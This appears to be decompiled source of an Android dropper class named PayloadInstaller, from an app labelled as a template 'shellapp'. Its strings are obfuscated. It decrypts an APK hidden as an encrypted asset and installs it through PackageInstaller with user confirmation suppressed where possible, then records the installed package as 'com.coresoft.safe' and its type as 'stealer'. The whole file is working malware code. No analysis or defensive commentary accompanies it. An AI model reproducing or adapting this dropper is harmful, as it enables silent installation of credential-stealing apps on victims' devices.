package com.template.shellapp;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.util.Log;
import java.io.InputStream;
import java.io.OutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import kotlin.Metadata;
import kotlin.collections.ArraysKt;
import kotlin.io.ByteStreamsKt;
import kotlin.jvm.internal.Intrinsics;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage2/classes.dex */
@Metadata(d1 = {"\u0000(\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0003\n\u0002\u0010\u000e\n\u0002\b\t\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0012\n\u0002\b\u0005\bÆ\u0002\u0018\u00002\u00020\u0001B\t\b\u0002¢\u0006\u0004\b\u0002\u0010\u0003J\u0006\u0010\u000b\u001a\u00020\u0005J\u0006\u0010\f\u001a\u00020\u0005J\u0006\u0010\r\u001a\u00020\u0005J\u000e\u0010\u000e\u001a\u00020\u000f2\u0006\u0010\u0010\u001a\u00020\u0011J\u0012\u0010\u0012\u001a\u0004\u0018\u00010\u00132\u0006\u0010\u0010\u001a\u00020\u0011H\u0002J\u0018\u0010\u0014\u001a\u00020\u000f2\u0006\u0010\u0010\u001a\u00020\u00112\u0006\u0010\u0015\u001a\u00020\u0013H\u0002J\u0010\u0010\u0016\u001a\u00020\u00132\u0006\u0010\u0017\u001a\u00020\u0005H\u0002R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u0005X\u0082T¢\u0006\u0002\n\u0000¨\u0006\u0018"}, d2 = {"Lcom/template/shellapp/PayloadInstaller;", "", "<init>", "()V", "TAG", "", "ASSET_NAME", "AES_KEY_HEX", "TARGET_PKG", "PAYLOAD_TYPE", "WEBVIEW_URL", "getTargetPackage", "getPayloadType", "getWebViewUrl", "install", "", "context", "Landroid/content/Context;", "decryptPayload", "", "installApk", "apk", "hexToBytes", "hex", "app_release"}, k = 1, mv = {2, 1, 0}, xi = 48)
public final class PayloadInstaller {
    private static final String WEBVIEW_URL = null;
    private static final String AES_KEY_HEX = C0000.decode(new byte[]{83, 5, 82, 80, 4, 89, 2, 89, 11, 2, 9, 85, 87, 4, 86, 90, 2, 83, 85, 4, 3, 2, 5, 9, 87, 80, 1, 1, 86, 1, 85, 93, 85, 1, 92, 2, 83, 4, 80, 94, 5, 1, 9, 4, 84, 0, 11, 12, 81, 8, 83, 5, 83, 3, 83, 13, 7, 80, 11, 85, 6, 7, 3, 15}, "00d1aac83d80be39", 4);
    private static final String ASSET_NAME = C0000.decode(new byte[]{20, 82, 79, 88, 94, 0, 1, 79, 83, 80}, "d3641aea72", 4);
    private static final String PAYLOAD_TYPE = C0000.decode(new byte[]{69, 65, 82, 2, 9, 7, 70}, "657ceb4362e444", 0.0f);
    private static final String TAG = C0000.decode(new byte[]{98, 123, 110, 33, 115, 113}, "221e16");
    private static final String TARGET_PKG = C0000.decode(new byte[]{83, 95, 93, 25, 81, 14, 64, 87, 16, 94, 86, 68, 30, 68, 83, 7, 87}, "00072a22c1", true);
    public static final PayloadInstaller INSTANCE = new PayloadInstaller();

    private final byte[] decryptPayload(Context context) {
        String strDecode = C0000.decode(new byte[]{49, 126, 58, 113, 119, 118}, "a7e55198dba9");
        String strDecode2 = C0000.decode(new byte[]{86, 4, 91, 66, 65, 18, 23, 87, 86, 91, 24}, "2a808bc2", 0.0f);
        String strDecode3 = C0000.decode(new byte[]{80, 65, 69, 87, 23, 16, 69, 93, 89, 18, 16, 93, 80, 94, 90, 8, 67}, "1262c0", 2);
        try {
            InputStream inputStreamOpen = context.getAssets().open(C0000.decode(new byte[]{66, 88, 76, 88, 14, 82, 80, 25, 82, 87}, "2954a3476537", 5));
            Intrinsics.checkNotNullExpressionValue(inputStreamOpen, C0000.decode(new byte[]{86, 22, 3, 87, 25, 23, 27, 74, 25}, "9ff9195d0f47"));
            byte[] bytes = ByteStreamsKt.readBytes(inputStreamOpen);
            inputStreamOpen.close();
            if (bytes.length < 32) {
                Log.e(strDecode, strDecode3 + bytes.length);
                return null;
            }
            byte[] bArrCopyOfRange = ArraysKt.copyOfRange(bytes, 0, 16);
            byte[] bArrCopyOfRange2 = ArraysKt.copyOfRange(bytes, 16, bytes.length);
            byte[] bArrHexToBytes = hexToBytes(C0000.decode(new byte[]{82, 6, 84, 84, 6, 14, 85, 87, 9, 80, 0, 86, 87, 84, 6, 85, 6, 85, 0, 3, 83, 80, 4, 4, 7, 2, 13, 7, 5, 82, 87, 87, 7, 4, 91, 5, 6, 83, 2, 80, 7, 86, 83, 1, 85, 83, 12, 3, 80, 14, 6, 7, 80, 87, 83, 3, 0, 2, 2, 83, 85, 81, 82, 3}, "13b5c64616"));
            Cipher cipher = Cipher.getInstance(C0000.decode(new byte[]{116, 114, 96, 75, 112, 123, 38, 75, 101, 40, 37, 54, 12, 105, 85, 93, 81, 94, 93, 3}, "573d39ed5cfe9949", 0));
            cipher.init(2, new SecretKeySpec(bArrHexToBytes, C0000.decode(new byte[]{117, 116, 100}, "417ba8862f769e", true)), new IvParameterSpec(bArrCopyOfRange));
            byte[] bArrDoFinal = cipher.doFinal(bArrCopyOfRange2);
            if (bArrDoFinal.length >= 4 && bArrDoFinal[0] == 80 && bArrDoFinal[1] == 75 && bArrDoFinal[2] == 3 && bArrDoFinal[3] == 4) {
                Log.d(strDecode, strDecode2 + bArrDoFinal.length + C0000.decode(new byte[]{68, 3, 24, 76, 7, 17}, "daa8bbaa84c06de8", 0.0f));
                return bArrDoFinal;
            }
            Log.e(strDecode, C0000.decode(new byte[]{90, 15, 79, 4, 13, 10, 6, 65, 115, 102, 46, 17, 94, 0, 94, 12, 2}, "3a9eacba26e1", 0.0f));
            return null;
        } catch (Exception e) {
            Log.e(strDecode, C0000.decode(new byte[]{81, 4, 83, 74, 27, 68, 67, 20, 94, 5, 88, 8, 0, 1, 13, 68}, "5a08b4748d1dee7d", true) + e.getMessage());
            return null;
        }
    }

    public final String getPayloadType() {
        return C0000.decode(new byte[]{75, 16, 6, 7, 8, 86, 20}, "8dcfd3f98484b4", 6);
    }

    public final String getTargetPackage() {
        return C0000.decode(new byte[]{6, 14, 89, 72, 81, 10, 23, 4, 71, 9, 84, 17, 75, 18, 85, 0, 87}, "ea4f2e", 0.0f);
    }

    public final String getWebViewUrl() {
        return "";
    }

    public final boolean install(Context context) {
        Intrinsics.checkNotNullParameter(context, C0000.decode(new byte[]{87, 87, 13, 68, 92, 64, 17}, "48c098ec1388", true));
        try {
            byte[] bArrDecryptPayload = decryptPayload(context);
            if (bArrDecryptPayload == null) {
                return false;
            }
            return installApk(context, bArrDecryptPayload);
        } catch (Exception e) {
            Log.e(C0000.decode(new byte[]{98, 45, 59, 118, 33, 114}, "2dd2c5"), C0000.decode(new byte[]{15, 94, 75, 70, 81, 88, 84, 24, 5, 7, 12, 90, 7, 80, 14, 24}, "f0820488cfe6b448") + e.getMessage());
            return false;
        }
    }

    private PayloadInstaller() {
    }

    private final boolean installApk(Context context, byte[] apk) {
        try {
            PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
            Intrinsics.checkNotNullExpressionValue(packageInstaller, "getPackageInstaller(...)");
            PackageInstaller.SessionParams sessionParams = new PackageInstaller.SessionParams(1);
            sessionParams.setSize(apk.length);
            if (Build.VERSION.SDK_INT >= 31) {
                sessionParams.setRequireUserAction(2);
            }
            int iCreateSession = packageInstaller.createSession(sessionParams);
            PackageInstaller.Session sessionOpenSession = packageInstaller.openSession(iCreateSession);
            Intrinsics.checkNotNullExpressionValue(sessionOpenSession, "openSession(...)");
            OutputStream outputStreamOpenWrite = sessionOpenSession.openWrite("base.apk", 0L, apk.length);
            Intrinsics.checkNotNullExpressionValue(outputStreamOpenWrite, "openWrite(...)");
            int i = 0;
            while (i < apk.length) {
                int iMin = Math.min(65536, apk.length - i);
                outputStreamOpenWrite.write(apk, i, iMin);
                i += iMin;
            }
            sessionOpenSession.fsync(outputStreamOpenWrite);
            outputStreamOpenWrite.close();
            context.getSharedPreferences("app_data", 0).edit().putString("tp", "com.coresoft.safe").putString("pt", "stealer").apply();
            sessionOpenSession.commit(PendingIntent.getBroadcast(context, iCreateSession, new Intent(context, (Class<?>) CB.class), Build.VERSION.SDK_INT >= 31 ? 167772160 : 134217728).getIntentSender());
            Log.d("PI_DBG", "session committed, id=" + iCreateSession);
            return true;
        } catch (Exception e) {
            Log.e("PI_DBG", "installApk failed: " + e.getMessage());
            return false;
        }
    }

    private final byte[] hexToBytes(String hex) {
        int length = hex.length();
        byte[] bArr = new byte[length / 2];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4) + Character.digit(hex.charAt(i + 1), 16));
        }
        return bArr;
    }
}
